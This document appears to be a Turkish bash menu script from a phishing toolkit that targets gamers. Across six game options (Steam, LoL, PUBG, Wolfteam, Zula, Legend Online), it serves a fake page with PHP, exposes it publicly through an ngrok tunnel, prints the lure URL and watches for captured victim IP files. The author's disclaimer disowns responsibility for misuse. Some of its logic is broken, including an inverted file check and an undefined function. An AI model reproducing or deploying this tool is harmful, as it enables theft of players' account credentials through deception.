#!/bin/bash
#Code : Yaman Efkar
#Youtube : YamanEfkar
#İnstagram : @turksibertimi
#Bu toolun kullanımında meydana gelicek hiç bir şey sorumluluğumda değildir!Kişi yaptığı tüm işlerden kendisi sorumludur!
#Turk-Sploi-Pluas
banner_game(){
	clear
	echo -e "\033[31;40;1m

		   \e[36m            Oyunlar
		   \e[32m*******************************
			█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█\e[31m
			█░░╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗░░█
			█░░║║║╠─║─║─║║║║║╠─░░█
			█░░╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝░░█\e[34m
			█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█

		   \e[31m[\e[32m01\e[31m]\e[37mSteam		\e[31m[\e[32m02\e[31m]\e[37mLol

		   \e[31m[\e[32m03\e[31m]\e[37mPubg	        \e[31m[\e[32m04\e[31m]\e[37mWolfteam

		   \e[31m[\e[32m05\e[31m]\e[37mZula	        \e[31m[\e[32m06\e[31m]\e[37mLegend Online	

		   \e[34m******************************* 

		   \e[31m[\e[32m99\e[31m]\e[37mAna Menü


			"
read -p $'\e[31m[\e[32m!\e[31m]\e[37mİşlem Numarası : ' islem_game

}


don() {

echo -e '\e[31m[\e[32m!\e[31m]\e[37m Hazır !'

while [ true ]; do


if [[ -e "sites/$server/ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Adresi Bulunamadı\n"
catch_ip

fi
sleep 1
done

}

banner_game

if [[ $islem_game == 1 || $islem_game == 01 ]]; then
	read -p $'\e[31m[\e[32m!\e[31m]\e[37mİşlem Numarası : ' port	
	echo ""
	echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
	sleep 1
	cd steam/ &&
	php -S 127.0.0.1:$port > /dev/null 2>&1 &
	sleep 2
	ngrok http $port > /dev/null 2>&1 &
	sleep 10
	link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
	echo -e '\e[31m[\e[32m-----\e[31m]\e[37mUrl : '$link
	don



	elif [[ $islem_game == 2 || $islem_game == 02 ]]; then
	read -p $'\e[31m[\e[32m!\e[31m]\e[37mİşlem Numarası : ' port	
	echo ""
	echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
	sleep 1
	cd lol/ && 
	php -S 127.0.0.1:$port > /dev/null 2>&1 &
	sleep 2
	ngrok http $port > /dev/null 2>&1 &
	sleep 10
	link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
	echo -e '\e[31m[\e[32m-----\e[31m]\e[37mUrl : '$link
	don


	elif [[ $islem_game == 3 || $islem_game == 03 ]]; then
	read -p $'\e[31m[\e[32m!\e[31m]\e[37mİşlem Numarası : ' port	
	echo ""
	echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
	sleep 1
	cd pubg/ &&
	php -S 127.0.0.1:$port > /dev/null 2>&1 &
	sleep 2
	ngrok http $port > /dev/null 2>&1 &
	sleep 10
	link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
	echo -e '\e[31m[\e[32m-----\e[31m]\e[37mUrl : '$link
	don

	elif [[ $islem_game == 4 || $islem_game == 04 ]]; then
	read -p $'\e[31m[\e[32m!\e[31m]\e[37mİşlem Numarası : ' port	
	echo ""
	echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
	sleep 1
	cd wolfteam/ &&
	php -S 127.0.0.1:$port > /dev/null 2>&1 &
	sleep 2
	ngrok http $port > /dev/null 2>&1 &
	sleep 10
	link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
	echo -e '\e[31m[\e[32m-----\e[31m]\e[37mUrl : '$link
	don

	elif [[ $islem_game == 5 || $islem_game == 05 ]]; then
	read -p $'\e[31m[\e[32m!\e[31m]\e[37mİşlem Numarası : ' port	
	echo ""
	echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
	sleep 1
	cd zula/ &&
	php -S 127.0.0.1:$port > /dev/null 2>&1 &
	sleep 2
	ngrok http $port > /dev/null 2>&1 &
	sleep 10
	link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
	echo -e '\e[31m[\e[32m-----\e[31m]\e[37mUrl : '$link
	don

	elif [[ $islem_game == 6 || $islem_game == 06 ]]; then
	read -p $'\e[31m[\e[32m!\e[31m]\e[37mİşlem Numarası : ' port	
	echo ""
	echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
	sleep 1
	cd legend/ && 
	php -S 127.0.0.1:$port > /dev/null 2>&1 &
	sleep 2
	ngrok http $port > /dev/null 2>&1 &
	sleep 10
	link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
	echo -e '\e[31m[\e[32m-----\e[31m]\e[37mUrl : '$link
	don


	elif [[ $islem_game == 9 || $islem_game == 99 ]]; then
		bash ../tst.sh

	else
		echo -e '\033[31;40;1m İslem Numaranızı Kontrol Ediniz!'
		sleep 2
		bash game.sh
	fi
